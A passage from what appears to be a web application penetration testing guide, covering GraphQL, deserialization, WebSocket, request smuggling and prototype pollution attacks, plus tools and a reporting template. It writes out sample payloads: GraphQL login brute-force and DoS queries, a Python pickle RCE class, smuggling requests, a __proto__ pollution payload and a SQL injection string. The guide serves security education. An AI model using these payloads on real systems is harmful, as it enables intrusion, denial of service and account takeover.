   ├── Sensitive operations
   └── Hidden functionality

2. BATCHING ATTACKS
   Bypass rate limiting:
   [
     {"query": "mutation{login(user:\"a\",pass:\"1\")}"},
     {"query": "mutation{login(user:\"a\",pass:\"2\")}"},
     {"query": "mutation{login(user:\"a\",pass:\"3\")}"}
   ]

3. DEEP QUERY ATTACKS (DoS)
   query {
     user(id: 1) {
       friends {
         friends {
           friends {
             friends { ... }
           }
         }
       }
     }
   }

4. FIELD DUPLICATION
   query {
     user(id: 1) {
       password
       password
       password
       ... # Repeat 10000 times
     }
   }

5. DIRECTIVE OVERLOADING
   query {
     user @include(if: true) @include(if: true) ... {
       name
     }
   }

6. AUTHORIZATION BYPASS
   Direct query to restricted fields:
   query { adminPanel { users { password }}}
   
   Type confusion:
   Query interface instead of concrete type
```

---

## 9. Modern Attack Vectors

### 9.1 Deserialization Attacks

```
Deserialization Theory:
━━━━━━━━━━━━━━━━━━━━━━

Insecure deserialization occurs when untrusted data
is used to instantiate objects, potentially leading to:
• Remote Code Execution
• Privilege Escalation
• Injection attacks
• DoS

Language-Specific Attacks:
┌──────────────────────────────────────────────────────────┐
│ JAVA                                                     │
│ Magic bytes: AC ED 00 05 (raw), rO0AB (base64)           │
│ Headers: Content-Type: application/x-java-serialized     │
│                                                          │
│ Gadget Chains:                                           │
│ • Commons Collections                                    │
│ • Spring Framework                                       │
│ • Apache Commons BeanUtils                               │
│                                                          │
│ Tools: ysoserial, JNDI-Injection-Exploit                 │
├──────────────────────────────────────────────────────────┤
│ PHP                                                      │
│ Format: O:4:"User":2:{s:4:"name";s:5:"admin"...}        │
│                                                          │
│ Attack vectors:                                          │
│ • __wakeup() and __destruct() magic methods              │
│ • Property Oriented Programming (POP chains)             │
│                                                          │
│ Tools: PHPGGC                                            │
├──────────────────────────────────────────────────────────┤
│ PYTHON                                                   │
│ Pickle format: \x80\x04\x95...                           │
│                                                          │
│ RCE payload:                                             │
│ import pickle                                            │
│ class RCE:                                               │
│     def __reduce__(self):                                │
│         return (os.system, ('id',))                      │
│                                                          │
├──────────────────────────────────────────────────────────┤
│ .NET                                                     │
│ Formats: BinaryFormatter, ObjectStateFormatter,          │
│          ViewState, TypeNameHandling in JSON.NET         │
│                                                          │
│ Tools: ysoserial.net                                     │
└──────────────────────────────────────────────────────────┘
```

### 9.2 WebSocket Security

```
WebSocket Attack Surface:
━━━━━━━━━━━━━━━━━━━━━━━━

WebSocket Handshake:
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

Attack Vectors:
┌─────────────────────────────────────────────────────────┐
│ 1. CROSS-SITE WEBSOCKET HIJACKING (CSWSH)               │
│    • No CSRF protection in handshake                    │
│    • Origin header not validated                        │
│    • Attacker page establishes WS to victim's session   │
│                                                          │
│ 2. MESSAGE INJECTION                                    │
│    • Standard input validation issues                   │
│    • XSS in WebSocket messages displayed in DOM         │
│    • SQL injection via WebSocket parameters             │
│                                                          │
│ 3. AUTHENTICATION BYPASS                                │
│    • Session token in URL (logged in referrer)          │
│    • Token not validated per-message                    │
│    • Lack of re-authentication                          │
│                                                          │
│ 4. SMUGGLING                                            │
│    • HTTP request smuggling via WebSocket upgrade       │
│    • Reverse proxy bypass                               │
└─────────────────────────────────────────────────────────┘

Testing Approach:
1. Analyze handshake (Origin validation)
2. Inspect message format (JSON, binary)
3. Test input validation
4. Check authorization per-message
5. Test for CSWSH
```

### 9.3 HTTP Request Smuggling

```
Request Smuggling Theory:
━━━━━━━━━━━━━━━━━━━━━━━━

Occurs when front-end and back-end servers disagree
on request boundaries, allowing attacker to "smuggle"
malicious requests.

Techniques:
┌─────────────────────────────────────────────────────────┐
│ CL.TE (Front-end uses Content-Length,                   │
│        Back-end uses Transfer-Encoding)                 │
│                                                          │
│ POST / HTTP/1.1                                         │
│ Host: target.com                                        │
│ Content-Length: 13                                      │
│ Transfer-Encoding: chunked                              │
│                                                          │
│ 0                                                       │
│                                                          │
│ SMUGGLED                                                │
├─────────────────────────────────────────────────────────┤
│ TE.CL (Front-end uses Transfer-Encoding,                │
│        Back-end uses Content-Length)                    │
│                                                          │
│ POST / HTTP/1.1                                         │
│ Host: target.com                                        │
│ Content-Length: 3                                       │
│ Transfer-Encoding: chunked                              │
│                                                          │
│ 8                                                       │
│ SMUGGLED                                                │
│ 0                                                       │
│                                                          │
├─────────────────────────────────────────────────────────┤
│ TE.TE (Both use Transfer-Encoding, but can be           │
│        obfuscated to confuse one)                       │
│                                                          │
│ Transfer-Encoding: xchunked                             │
│ Transfer-Encoding : chunked                             │
│ Transfer-Encoding: chunked                              │
│ Transfer-Encoding: x                                    │
│  Transfer-Encoding: chunked                             │
└─────────────────────────────────────────────────────────┘

Impact:
• Bypass security controls
• Request hijacking
• Web cache poisoning
• Credential hijacking
```

### 9.4 Client-Side Prototype Pollution

```
Prototype Pollution Theory:
━━━━━━━━━━━━━━━━━━━━━━━━━━

Exploits JavaScript's prototype-based inheritance to
inject properties into Object.prototype, affecting
all objects in the application.

Vulnerable Pattern:
┌─────────────────────────────────────────────────────────┐
│ function merge(target, source) {                        │
│   for (let key in source) {                             │
│     if (typeof source[key] === 'object') {              │
│       target[key] = merge(target[key], source[key]);    │
│     } else {                                            │
│       target[key] = source[key];                        │
│     }                                                   │
│   }                                                      │
│   return target;                                        │
│ }                                                       │
│                                                          │
│ // Attack:                                              │
│ merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}')); │
│                                                          │
│ // Now ALL objects have isAdmin = true                  │
│ let user = {};                                          │
│ console.log(user.isAdmin); // true                      │
└─────────────────────────────────────────────────────────┘

Exploitation Scenarios:
├── DOM XSS via polluted HTML attributes
├── Bypassing security checks
├── Configuration manipulation
└── DoS via polluted functions

Gadgets for XSS:
• innerHTML polluted
• Script src polluted
• event handlers polluted
```

---

## 10. Testing Tools & Techniques

### 10.1 Essential Toolset

```
Tool Categories:
━━━━━━━━━━━━━━━━

INTERCEPTION PROXIES:
├── Burp Suite Professional
├── OWASP ZAP
├── mitmproxy
└── Fiddler

RECONNAISSANCE:
├── Amass, Subfinder (subdomain enumeration)
├── httpx, httprobe (probing)
├── Nuclei (vulnerability scanning)
├── Nmap (port scanning)
└── WhatWeb, Wappalyzer (fingerprinting)

EXPLOITATION:
├── SQLMap (SQL injection)
├── Commix (command injection)
├── XSSHunter (XSS discovery)
├── tplmap (SSTI)
└── XXEinjector (XXE)

FUZZING:
├── ffuf (web fuzzing)
├── wfuzz (parameter fuzzing)
├── Feroxbuster (directory brute)
└── Arjun (parameter discovery)

SPECIALIZED:
├── jwt_tool (JWT attacks)
├── GraphQLmap (GraphQL)
├── ysoserial (Java deserialization)
└── smuggler (HTTP smuggling)
```

### 10.2 Burp Suite Methodology

```
Burp Testing Workflow:
━━━━━━━━━━━━━━━━━━━━━

1. SCOPE CONFIGURATION
   ├── Define target scope
   ├── Configure upstream proxy
   └── Setup session handling

2. PASSIVE SCANNING
   ├── Spider/crawl application
   ├── Review site map
   └── Analyze passive scan results

3. MANUAL EXPLORATION
   ├── Walk through functionality
   ├── Identify input vectors
   └── Note interesting behaviors

4. ACTIVE TESTING
   ├── Intruder attacks
   ├── Repeater manipulation
   ├── Scanner active scan
   └── Extension-based testing

5. ISSUE VALIDATION
   ├── Reproduce vulnerabilities
   ├── Assess impact
   └── Document proof-of-concept
```

---

## 11. Reporting Framework

### 11.1 Vulnerability Documentation

```
Report Structure:
━━━━━━━━━━━━━━━━

EXECUTIVE SUMMARY
├── Engagement overview
├── Risk rating summary
├── Critical findings overview
└── Remediation priorities

TECHNICAL FINDINGS
For each vulnerability:
┌─────────────────────────────────────────────────────────┐
│ Title: SQL Injection in User Search Function           │
│                                                          │
│ Severity: CRITICAL (CVSS: 9.8)                          │
│                                                          │
│ Location: /api/users/search?name=                       │
│                                                          │
│ Description:                                            │
│ The application fails to sanitize user input in the     │
│ search parameter, allowing SQL injection attacks.       │
│                                                          │
│ Impact:                                                 │
│ • Full database access                                  │
│ • Data exfiltration                                     │
│ • Potential RCE via xp_cmdshell                         │
│                                                          │
│ Reproduction Steps:                                     │
│ 1. Navigate to /api/users/search                        │
│ 2. Input: ' OR 1=1--                                    │
│ 3. Observe: All users returned                          │
│                                                          │
│ Evidence:                                               │
│ [Request/Response screenshots]                          │
│ [SQLMap output]                                         │
│                                                          │
│ Remediation:                                            │
│ 1. Implement parameterized queries                      │
│ 2. Apply input validation                               │
│ 3. Implement WAF rules                                  │
│                                                          │
│ References:                                             │
│ • CWE-89                                                │
│ • OWASP SQL Injection                                   │
└─────────────────────────────────────────────────────────┘

RISK RATING METHODOLOGY:
┌─────────────┬──────────────────────────────────────────┐
│ CRITICAL    │ RCE, Full DB access, Admin takeover      │
│ HIGH        │ Significant data breach, Privilege esc.  │
│ MEDIUM      │ Limited access, Partial disclosure       │
│ LOW         │ Information disclosure, Minor issues     │
│ INFO        │ Best practice recommendations            │
└─────────────┴──────────────────────────────────────────┘
```

